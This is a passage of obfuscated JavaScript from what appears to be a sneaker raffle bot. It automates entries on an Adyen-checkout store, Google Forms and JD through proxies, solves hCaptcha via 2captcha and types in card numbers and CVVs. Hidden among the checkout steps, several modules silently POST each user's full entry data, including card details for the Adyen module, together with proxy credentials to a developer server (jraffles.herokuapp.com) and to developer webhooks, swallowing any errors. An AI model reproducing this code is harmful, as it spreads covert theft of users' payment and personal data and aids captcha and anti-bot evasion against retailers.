_0x2054c4['click']('button.btn.continue-button__1RtsS'), await _0xa2099c(0x4b0), console['log'](_0x24b1d6() + '\x20[' + _0x2a07ef['name'] + ']\x20Task\x20' + (_0x30c70d + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x2054c4['solveRecaptchas'](), console['log'](_0x24b1d6() + '\x20[' + _0x2a07ef['name'] + ']\x20Task\x20' + (_0x30c70d + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0xa2099c(0xbb8), await _0x2054c4['click']('button.btn.continue-button__1RtsS'), await _0xa2099c(0x1388), console['log'](_0x24b1d6() + '\x20[' + _0x2a07ef['name'] + ']\x20Task\x20' + (_0x30c70d + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x2054c4['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2054c4['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xa2099c(0x4b0), await _0x2054c4['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x1e7b39[_0x30c70d]['CardNumber']), await _0xa2099c(0x320), await _0x2054c4['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x2054c4['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x1e7b39[_0x30c70d]['ExpiryDate']), await _0xa2099c(0x4b0), await _0x2054c4['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x2054c4['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x1e7b39[_0x30c70d]['CVV']), await _0xa2099c(0x226), await _0x2054c4['type']('input[name=\x22holderName\x22]', '' + _0x1e7b39[_0x30c70d]['NameOnCard']), await _0xa2099c(0x226), await _0x2054c4['click']('button.adyen-checkout__button'), console['log'](_0x24b1d6() + '\x20[' + _0x2a07ef['name'] + ']\x20Task\x20' + (_0x30c70d + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x2054c4['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0xa2099c(0xbb8);
                        } catch (_0x58321c) {
                            console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x2a07ef['name'] + ']\x20Task\x20' + (_0x30c70d + 0x1) + '\x20:\x203DS\x20Failed')), _0x1e3bcf = '3DS\x20Error\x20' + _0x58321c;
                            var _0x4f9450 = await _0x258e8b(_0x1e7b39[_0x30c70d], _0x2a07ef, 'dev', !![], _0x1e3bcf);
                            _0x5bf6fd['errorDEV'] = { 'embeds': [_0x4f9450] };
                            _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x5bf6fd['errorDEV']);
                            await _0x310f97(_0x281108, _0x5bf6fd['errorDEV']);
                            continue;
                        }
                        _0x48af7e(_0x1e7b39[_0x30c70d], _0x2a07ef), console['log'](_0x536226['green'](_0x24b1d6() + '\x20[' + _0x2a07ef['name'] + ']\x20Task\x20' + (_0x30c70d + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x44ef4a = _0x1e7b39[_0x30c70d];
                        try {
                            prxdata = {
                                'username': _0x1bdb7f['replace']('#', ''),
                                'module': _0x2a07ef['name'],
                                'entrydata': JSON['stringify'](_0x44ef4a),
                                'proxy': '' + _0x36ca67[_0x30c70d]
                            };
                            var _0x3446ba = JSON['stringify'](prxdata);
                            let _0x291588 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x3f36f4['post']('https://jraffles.herokuapp.com/success', _0x3446ba, _0x291588);
                        } catch (_0x4d000b) {
                        }
                        if (_0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '')
                            try {
                                await _0x310f97(_0x2795a0['webhook'], _0x5bf6fd['succesDEVMSG']);
                            } catch {
                            }
                        await _0xa2099c(0xc8), await _0x310f97(_0x8cde2d, _0x5bf6fd['succesDEVMSG']), await _0xa2099c(0xc8);
                        try {
                            await _0x310f97(_0x44d24a, _0x5bf6fd['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x4ceece) {
                        console['log'](_0x24b1d6() + '\x20[' + _0x2a07ef['name'] + ']\x20Task\x20' + (_0x30c70d + 0x1) + '\x20:\x20' + _0x4ceece), _0x1e3bcf = '' + _0x4ceece;
                        var _0x4f9450 = await _0x258e8b(_0x1e7b39[_0x30c70d], _0x2a07ef, 'dev', !![], _0x1e3bcf);
                        _0x5bf6fd['errorDEV'] = { 'embeds': [_0x4f9450] }, _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x5bf6fd['errorDEV']), await _0x310f97(_0x281108, _0x5bf6fd['errorDEV']), _0x20fb77 = 'yes';
                    } finally {
                        _0x1da53c['close']();
                        if (_0x20fb77 == 'yes' && _0xd7eb73 != 0x5) {
                            console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x2a07ef['name'] + ']\x20Task\x20' + (_0x30c70d + 0x1) + '\x20:\x20Retrying\x20(' + _0xd7eb73 + '\x20/\x205)')), _0x30c70d = _0x30c70d - 0x1, _0xd7eb73 = _0xd7eb73 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x2795a0['delay'] + '\x20ms'), await _0xa2099c(_0x2795a0['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'Google\x20Forms',
        'modules': [{
            'name': 'SMART\x20ENTRIES',
            'store': 'Google\x20Forms',
            'logo': 'https://www.pngplay.com/wp-content/uploads/13/Google-Logo-PNG-HD-Quality.png',
            'function': async function (_0x174996, _0x214bc7, _0x12be62) {
                function _0x63bfef(_0x37bcbd) {
                    console['log'](_0x24b1d6() + '\x20[' + _0x174996['name'] + ']\x20Task\x20' + (_0x4de54d + 0x1) + '\x20:\x20' + _0x37bcbd);
                }
                _0xfda795['use'](_0x442f24()), _0xfda795['use'](_0x5943b7({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x2795a0['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x4de54d = 0x0; _0x4de54d < _0x214bc7['length']; _0x4de54d++) {
                    var _0xfa8504;
                    if (_0x1a6cfa != 'yes')
                        var _0x1a6cfa = '', _0x35ed88 = 0x0;
                    try {
                        await _0x53ad15(_0x214bc7, _0x4de54d);
                    } catch {
                        _0x1a6cfa = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x214bc7[_0x4de54d]['Email'] == '' || _0x214bc7[_0x4de54d]['FirstName'] == '' || _0x214bc7[_0x4de54d]['LastName'] == '' || _0x214bc7[_0x4de54d]['Country'] == '' || _0x214bc7[_0x4de54d]['Size'] == '' || _0x214bc7[_0x4de54d]['Address1'] == '' || _0x214bc7[_0x4de54d]['Zip'] == '') {
                        console['log'](_0x24b1d6() + '\x20[' + _0x174996['name'] + ']\x20Task\x20' + (_0x4de54d + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x2795a0['useRandomProxy'] = ![])
                        var _0x565f65 = _0x12be62[_0x4de54d]['split'](':');
                    else
                        var _0x5e7abd = Math['round'](Math['random']() * (_0x12be62['length'] - 0x1)), _0x565f65 = _0x12be62[_0x5e7abd]['split'](':');
                    var _0x5b1dba;
                    try {
                        _0x5b1dba = await _0xfda795['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x565f65[0x0] + ':' + _0x565f65[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x5b1dba = await _0xfda795['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x565f65[0x0] + ':' + _0x565f65[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x2a8fab = await _0x5b1dba['newPage']();
                        await _0x2a8fab['authenticate']({
                            'username': '' + _0x565f65[0x2],
                            'password': '' + _0x565f65[0x3]
                        }), _0x63bfef('Getting\x20Session'), await _0x2a8fab['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2a8fab['setRequestInterception'](!![]), _0x2a8fab['on']('request', _0x438c04 => {
                            _0x438c04['resourceType']() === 'image' || _0x438c04['resourceType']() === 'font' || _0x438c04['resourceType']() === 'media' ? _0x438c04['abort']() : _0x438c04['continue']();
                        });
                        try {
                            await _0x2a8fab['goto'](_0x214bc7[_0x4de54d]['Url']), await _0xa2099c(0xbb8), await _0x2a8fab['waitForSelector']('.teQAzf');
                        } catch (_0x1e5032) {
                            throw new Error(_0x1e5032);
                        }
                        let _0x9bd876 = await _0x2a8fab['$$']('.o3Dpx\x20>\x20div[role=\x22listitem\x22]');
                        for (question of _0x9bd876) {
                            let _0x1891b9 = await question['$eval']('.M7eMe', _0x58855e => _0x58855e['textContent']);
                            if (_0x1891b9['toLowerCase']()['includes']('mail') && !_0x1891b9['toLowerCase']()['includes']('agree')) {
                                _0x63bfef('Mail\x20Selector\x20found;\x20' + _0x1891b9);
                                const _0x2504ca = await question['$']('input');
                                await _0x2504ca['type'](_0x214bc7[_0x4de54d]['Email']), await _0xa2099c(0x258);
                                continue;
                            }
                            if (_0x1891b9['toLowerCase']()['includes']('first') || _0x1891b9['toLowerCase']() == 'name' || _0x1891b9['toLowerCase']() == 'name\x20') {
                                _0x63bfef('FirstName\x20Selector\x20found;\x20' + _0x1891b9);
                                const _0x2cc309 = await question['$']('input');
                                await _0x2cc309['type'](_0x214bc7[_0x4de54d]['FirstName'] + '\x20'), await _0xa2099c(0x258);
                                continue;
                            }
                            if (_0x1891b9['toLowerCase']()['includes']('last') || _0x1891b9['toLowerCase']()['includes']('surname')) {
                                _0x63bfef('LastName\x20Selector\x20found;\x20' + _0x1891b9);
                                const _0x4dd11d = await question['$']('input');
                                await _0x4dd11d['type'](_0x214bc7[_0x4de54d]['LastName'] + '\x20'), await _0xa2099c(0x258);
                                continue;
                            }
                            if (_0x1891b9['toLowerCase']()['includes']('address') && !_0x1891b9['toLowerCase']()['includes']('agree')) {
                                _0x63bfef('Address\x20Selector\x20found;\x20' + _0x1891b9);
                                const _0x29dfce = await question['$']('input');
                                await _0x29dfce['type'](_0x214bc7[_0x4de54d]['Address1'] + '\x20' + _0x214bc7[_0x4de54d]['HouseNumber'] + '\x20' + _0x214bc7[_0x4de54d]['Address2']), await _0xa2099c(0x258);
                                continue;
                            }
                            if (_0x1891b9['toLowerCase']()['includes']('phone') || _0x1891b9['toLowerCase']()['includes']('mobile')) {
                                _0x63bfef('Phone\x20Selector\x20found;\x20' + _0x1891b9);
                                const _0x149121 = await question['$']('input');
                                await _0x149121['type']('' + _0x214bc7[_0x4de54d]['Phone']), await _0xa2099c(0x258);
                                continue;
                            }
                            if (_0x1891b9['toLowerCase']()['includes']('country')) {
                                const _0x1f0ac1 = await question['$']('div[jsname=\x22wCJL8\x22]');
                                if (_0x1f0ac1) {
                                    let _0x3e3e63 = ![];
                                    const _0x8dcf88 = await _0x1f0ac1['$$']('.ulDsOb');
                                    for (option of _0x8dcf88) {
                                        let _0x191f05 = await option['$']('span'), _0x2c3e41 = await option['$eval']('span', _0x397e70 => _0x397e70['textContent']);
                                        if (_0x2c3e41['toLowerCase']() == _0x214bc7[_0x4de54d]['Country']['toLowerCase']()) {
                                            await _0x191f05['click'](), _0x3e3e63 = !![];
                                            break;
                                        }
                                    }
                                    if (!_0x3e3e63) {
                                        const _0x98ddf3 = await question['$']('.Hvn9fb.zHQkBf');
                                        await _0x98ddf3['click'](), await _0x98ddf3['type'](_0x214bc7[_0x4de54d]['Country']);
                                    }
                                    continue;
                                }
                                _0x63bfef('Country\x20Selector\x20found;\x20' + _0x1891b9);
                                const _0x233aff = await question['$']('input');
                                await _0x233aff['type']('' + _0x214bc7[_0x4de54d]['Country']), await _0xa2099c(0x258);
                                continue;
                            }
                            if (_0x1891b9['toLowerCase']()['includes']('city')) {
                                _0x63bfef('City\x20Selector\x20found;\x20' + _0x1891b9);
                                const _0x4a9087 = await question['$']('input');
                                await _0x4a9087['type']('' + _0x214bc7[_0x4de54d]['City']), await _0xa2099c(0x258);
                                continue;
                            }
                            if (_0x1891b9['toLowerCase']()['includes']('zip')) {
                                _0x63bfef('Zip\x20Selector\x20found;\x20' + _0x1891b9);
                                const _0x304f2e = await question['$']('input');
                                await _0x304f2e['type']('' + _0x214bc7[_0x4de54d]['Zip']), await _0xa2099c(0x258);
                                continue;
                            }
                            if (_0x1891b9['toLowerCase']()['includes']('insta')) {
                                _0x63bfef('Follower\x20Selector\x20found;\x20' + _0x1891b9);
                                const _0x2009a7 = await question['$']('input');
                                await _0x2009a7['type']('' + _0x214bc7[_0x4de54d]['Follower']), await _0xa2099c(0x258);
                                continue;
                            }
                            if (_0x1891b9['toLowerCase']()['includes']('size')) {
                                _0x63bfef('Size\x20Selector\x20found;\x20' + _0x1891b9);
                                const _0x31662b = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                if (_0x31662b) {
                                    const _0x413872 = await _0x31662b['$$']('.ulDsOb');
                                    for (size of _0x413872) {
                                        let _0x2df51e = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x8ce775 => _0x8ce775['textContent']);
                                        if (_0x2df51e['toLowerCase']()['includes'](_0x214bc7[_0x4de54d]['Size'])) {
                                            await size['click']();
                                            break;
                                        }
                                    }
                                }
                                const _0x296f55 = await question['$']('.ry3kXd');
                                if (_0x296f55) {
                                    await _0x296f55['click'](), await _0xa2099c(0x9c4);
                                    const _0xb66789 = await _0x2a8fab['$']('div[jsname=\x22V68bde\x22]'), _0x125f1c = await _0xb66789['$$']('div[jsname=\x22wQNmvb\x22]');
                                    for (size of _0x125f1c) {
                                        let _0x573ecd = await size['$eval']('.vRMGwf.oJeWuf', _0x42256e => _0x42256e['textContent']), _0x15890c = await size['$']('.vRMGwf.oJeWuf');
                                        if (_0x573ecd['toLowerCase']()['includes'](_0x214bc7[_0x4de54d]['Size'])) {
                                            await _0xa2099c(0x190), await _0x15890c['click']();
                                            break;
                                        }
                                    }
                                }
                                await _0xa2099c(0x258);
                                continue;
                            }
                            if (_0x1891b9['toLowerCase']()['includes']('receive') || _0x1891b9['toLowerCase']()['includes']('method')) {
                                _0x63bfef('Method\x20Selector\x20found;\x20' + _0x1891b9);
                                const _0x4ad1c1 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                if (_0x4ad1c1) {
                                    const _0x25e819 = await _0x4ad1c1['$$']('.ulDsOb');
                                    for (size of _0x25e819) {
                                        let _0x114361 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x1ca223 => _0x1ca223['textContent']);
                                        if (_0x114361['toLowerCase']()['includes']('shipping')) {
                                            await size['click']();
                                            break;
                                        }
                                    }
                                }
                                await _0xa2099c(0x258);
                                continue;
                            }
                            if (_0x1891b9['toLowerCase']()['includes']('offers') || _0x1891b9['toLowerCase']()['includes']('agree')) {
                                _0x63bfef('Authorization\x20Selector\x20found;\x20' + _0x1891b9);
                                const _0x18f2f7 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                if (_0x18f2f7) {
                                    const _0x25a84f = await _0x18f2f7['$$']('.ulDsOb');
                                    for (size of _0x25a84f) {
                                        let _0x1669af = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x6cf7c3 => _0x6cf7c3['textContent']);
                                        if (_0x1669af['toLowerCase']()['includes']('authorize') || _0x1669af['toLowerCase']()['includes']('yes')) {
                                            await size['click']();
                                            break;
                                        }
                                    }
                                }
                                await _0xa2099c(0x258);
                                continue;
                            }
                            _0x63bfef('No\x20property\x20found\x20for\x20selector:\x20' + _0x1891b9), await _0xa2099c(0x258);
                        }
                        await _0x2a8fab['click']('div[jsname=\x22M2UYVd\x22]');
                        try {
                            await _0x2a8fab['waitForSelector']('.vHW8K');
                        } catch {
                            throw new Error('Could\x20not\x20send\x20Form,\x20check\x20all\x20fields!');
                        }
                        _0x48af7e(_0x214bc7[_0x4de54d], _0x174996);
                        var _0x3ff88b = await _0x258e8b(_0x214bc7[_0x4de54d], _0x174996, 'dev', ![]), _0x2f250b = await _0x258e8b(_0x214bc7[_0x4de54d], _0x174996, 'pub', ![]);
                        let _0x47d27f = _0x214bc7[_0x4de54d];
                        try {
                            prxdata = {
                                'username': _0x1bdb7f['replace']('#', ''),
                                'module': _0x174996['name'],
                                'entrydata': JSON['stringify'](_0x47d27f),
                                'proxy': '' + _0x12be62[_0x4de54d]
                            };
                            var _0xd5ac0 = JSON['stringify'](prxdata);
                            let _0x50923b = { 'headers': { 'content-type': 'application/json' } };
                            await _0x3f36f4['post']('https://jraffles.herokuapp.com/success', _0xd5ac0, _0x50923b);
                        } catch (_0xf8f138) {
                        }
                        const _0x3083a6 = {
                            'succesDEVMSG': { 'embeds': [_0x3ff88b] },
                            'succesPUBMSG': { 'embeds': [_0x2f250b] }
                        };
                        try {
                            _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x3083a6['succesDEVMSG']), await _0xa2099c(0xc8), await _0x310f97(_0x8cde2d, _0x3083a6['succesDEVMSG']), await _0xa2099c(0xc8), await _0x310f97(_0x44d24a, _0x3083a6['succesPUBMSG']);
                        } catch (_0x4e1c89) {
                            console['log'](_0x536226['yellow'](_0x24b1d6() + '\x20[' + _0xabefbd[taskModule]['name'] + ']\x20Task\x20' + (_0x4de54d + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4e1c89));
                        }
                        console['log'](_0x536226['green'](_0x24b1d6() + '\x20[' + _0x174996['name'] + ']\x20Task\x20' + (_0x4de54d + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                    } catch (_0x122886) {
                        console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x174996['name'] + ']\x20Task\x20' + (_0x4de54d + 0x1) + '\x20:\x20' + _0x122886)), _0xfa8504 = '' + _0x122886;
                        var _0x12b413 = await _0x258e8b(_0x214bc7[_0x4de54d], _0x174996, 'dev', !![], _0xfa8504);
                        let _0x1ed58c = {};
                        _0x1ed58c['errorDEV'] = { 'embeds': [_0x12b413] }, _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x1ed58c['errorDEV']), await _0x310f97(_0x281108, _0x1ed58c['errorDEV']), _0x1a6cfa = 'yes';
                    } finally {
                        _0x5b1dba['close']();
                        if (_0x1a6cfa == 'yes' && _0x35ed88 != 0x5) {
                            console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x174996['name'] + ']\x20Task\x20' + (_0x4de54d + 0x1) + '\x20:\x20Retrying\x20(' + _0x35ed88 + '\x20/\x205)')), _0x4de54d = _0x4de54d - 0x1, _0x35ed88 = _0x35ed88 + 0x1;
                            continue;
                        }
                        _0x63bfef('Waiting\x20for\x20' + _0x2795a0['delay'] + '\x20ms'), await _0xa2099c(_0x2795a0['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x5e6c12, _0x4af20c, _0x41c8ec) {
                var _0x108cb9 = ![], _0x334e83 = ![];
                if (_0x2795a0['captchaKey'] == '' || _0x2795a0['captchaKey'] == undefined)
                    return console['log'](_0x536226['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0xfda795['use'](_0x442f24()), _0xfda795['use'](_0x5943b7({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x2795a0['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x16d763 = 0x0; _0x16d763 < _0x4af20c['length']; _0x16d763++) {
                    if (_0x194a26 != 'yes')
                        var _0x194a26 = '', _0x428842 = 0x0;
                    var _0x390a69, _0xd496e7 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x4af20c[_0x16d763]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x4af20c[_0x16d763]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x1bdb7f
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x2795a0['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x39dec1
                            }
                        ]
                    }];
                    const _0x2172cb = { 'embeds': _0xd496e7 };
                    _0x215576(_0x5e6c12['name'] + '\x20Task\x20' + (_0x16d763 + 0x1) + '\x20/\x20' + _0x4af20c['length'] + '\x20||\x20File:\x20' + _0x47dda7 + '\x20Proxies:\x20' + _0x5184f4);
                    try {
                        await _0x53ad15(_0x4af20c, _0x16d763);
                    } catch {
                        _0x194a26 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x5ea355 = await _0x258e8b(_0x4af20c[_0x16d763], _0x5e6c12, 'dev', ![]), _0x8f6961 = await _0x258e8b(_0x4af20c[_0x16d763], _0x5e6c12, 'pub', ![]);
                    const _0x24da3 = {
                        'succesDEVMSG': { 'embeds': [_0x5ea355] },
                        'succesPUBMSG': { 'embeds': [_0x8f6961] }
                    };
                    if (_0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '')
                        try {
                            await _0x310f97(_0x2795a0['webhook'], _0x24da3['succesDEVMSG']);
                        } catch {
                        }
                    await _0xa2099c(0xc8), await _0x310f97(_0x8cde2d, _0x24da3['succesDEVMSG']), await _0xa2099c(0xc8);
                    try {
                        await _0x310f97(_0x44d24a, _0x24da3['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x4af20c[_0x16d763]['Email'] == '' || _0x4af20c[_0x16d763]['Url'] == '' || _0x4af20c[_0x16d763]['FirstName'] == '' || _0x4af20c[_0x16d763]['LastName'] == '') {
                        console['log'](_0x24b1d6() + '\x20[' + _0xabefbd[taskModule]['name'] + ']\x20Task\x20' + (_0x16d763 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x2795a0['useRandomProxy'] = ![])
                        var _0x4327fb = _0x41c8ec[_0x16d763]['split'](':');
                    else
                        var _0xf4626a = Math['round'](Math['random']() * (_0x41c8ec['length'] - 0x1)), _0x4327fb = _0x41c8ec[_0xf4626a]['split'](':');
                    var _0x430cc7;
                    try {
                        _0x430cc7 = await _0xfda795['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4327fb[0x0] + ':' + _0x4327fb[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x430cc7 = await _0xfda795['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4327fb[0x0] + ':' + _0x4327fb[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x535b2c = await _0x430cc7['newPage']();
                        await _0x535b2c['authenticate']({
                            'username': '' + _0x4327fb[0x2],
                            'password': '' + _0x4327fb[0x3]
                        }), console['log'](_0x24b1d6() + '\x20[' + _0x5e6c12['name'] + ']\x20Task\x20' + (_0x16d763 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x535b2c['setRequestInterception'](!![]), _0x535b2c['on']('request', _0x4d8057 => {
                            _0x4d8057['resourceType']() === 'image' || _0x4d8057['resourceType']() === 'font' || _0x4d8057['resourceType']() === 'media' ? _0x4d8057['abort']() : _0x4d8057['continue']();
                        });
                        try {
                            await _0x535b2c['goto']('' + _0x4af20c[_0x16d763]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x535b2c['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x24b1d6() + '\x20[' + _0x5e6c12['name'] + ']\x20Task\x20' + (_0x16d763 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x535b2c['type']('#comp_firstname', '' + _0x4af20c[_0x16d763]['FirstName']), await _0x535b2c['waitForSelector']('#comp_lastname'), await _0x535b2c['type']('#comp_lastname', '' + _0x4af20c[_0x16d763]['LastName']), await _0x535b2c['waitForSelector']('#comp_email'), await _0x535b2c['type']('#comp_email', '' + _0x4af20c[_0x16d763]['Email']), await _0x535b2c['waitForSelector']('#comp_paypalemail'), await _0x535b2c['type']('#comp_paypalemail', '' + _0x4af20c[_0x16d763]['Email']), await _0x535b2c['waitForSelector']('#comp_mobile_end'), await _0x535b2c['type']('#comp_mobile_end', '' + _0x4af20c[_0x16d763]['Phone']), await _0x535b2c['waitForSelector']('#comp_dob'), await _0x535b2c['type']('#comp_dob', '08/09/1992'), console['log'](_0x24b1d6() + '\x20[' + _0x5e6c12['name'] + ']\x20Task\x20' + (_0x16d763 + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x4af20c[_0x16d763]['Size'] == 'RANDOM') {
                            const _0x576dd5 = await _0x535b2c['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x1e5b00 => {
                                return _0x1e5b00['map'](_0x570f1d => _0x570f1d['value']);
                            });
                            var _0x9286f9 = Math['round'](Math['random']() * (_0x576dd5['length'] - 0x2));
                            await _0x535b2c['select']('#shoesize', _0x576dd5[_0x9286f9 + 0x1]), await _0xa2099c(0x3e8);
                        } else {
                            const _0x447138 = await _0x535b2c['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x318232 => {
                                return _0x318232['map'](_0x1bb70b => _0x1bb70b['innerText']);
                            }), _0x17ca29 = await _0x535b2c['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x366757 => {
                                return _0x366757['map'](_0xbf71f3 => _0xbf71f3['value']);
                            });
                            var _0x3f6f5f = _0x4af20c[_0x16d763]['Size'];
                            for (var _0xd772 = 0x1; _0xd772 < _0x17ca29['length']; _0xd772++) {
                                var _0x135991 = _0x447138[_0xd772]['split']('\x20')[0x0];
                                if (_0x135991 == _0x3f6f5f) {
                                    await _0x535b2c['select']('#shoesize', _0x17ca29[_0xd772]);
                                    break;
                                } else {
                                    if (_0xd772 + 0x1 == _0x17ca29['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x535b2c['waitForSelector']('#comp_address1'), await _0x535b2c['type']('#comp_address1', _0x4af20c[_0x16d763]['Address1'] + '\x20' + _0x4af20c[_0x16d763]['HouseNumber']), await _0x535b2c['waitForSelector']('#comp_address2'), await _0x535b2c['type']('#comp_address2', '' + _0x4af20c[_0x16d763]['Address2']), await _0x535b2c['waitForSelector']('#comp_address2'), await _0x535b2c['type']('#comp_address3', '' + _0x4af20c[_0x16d763]['City']), await _0x535b2c['waitForSelector']('#comp_postcode'), await _0x535b2c['type']('#comp_postcode', '' + _0x4af20c[_0x16d763]['Zip']), console['log'](_0x24b1d6() + '\x20[' + _0x5e6c12['name'] + ']\x20Task\x20' + (_0x16d763 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0xa2099c(0x4b0), await _0x535b2c['click']('label#emailhold'), await _0xa2099c(0x5dc), await _0x535b2c['click']('#preauth_tandc_email\x20>\x20label'), await _0xa2099c(0x5dc), await _0x535b2c['click']('#submit');
                        try {
                            await _0x535b2c['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x24b1d6() + '\x20[' + _0x5e6c12['name'] + ']\x20Task\x20' + (_0x16d763 + 0x1) + '\x20:\x20' + _0x536226['blue']('Awaiting\x20Paypal\x20Payment')), _0x430cc7['on']('targetcreated', async _0x4f7468 => {
                            if (_0x4f7468['type']() === 'page') {
                                const _0x17f4f1 = await _0x4f7468['page']();
                                async function _0x5c05ae() {
                                    try {
                                        await _0x535b2c['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x334e83 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x52139d() {
                                    try {
                                        await _0x535b2c['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x108cb9 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x52139d(), _0x5c05ae(), await _0xa2099c(0x493e0);
                            }
                        });
                        async function _0x2375e4() {
                            for (let _0x24c8f3 = 0x0; _0x24c8f3 < 0x12c; _0x24c8f3++) {
                                if (_0x108cb9 == !![]) {
                                    _0x194a26 = 'no', _0x48af7e(_0x4af20c[_0x16d763], _0x5e6c12), console['log'](_0x536226['green'](_0x24b1d6() + '\x20[' + _0x5e6c12['name'] + ']\x20Task\x20' + (_0x16d763 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '')
                                        try {
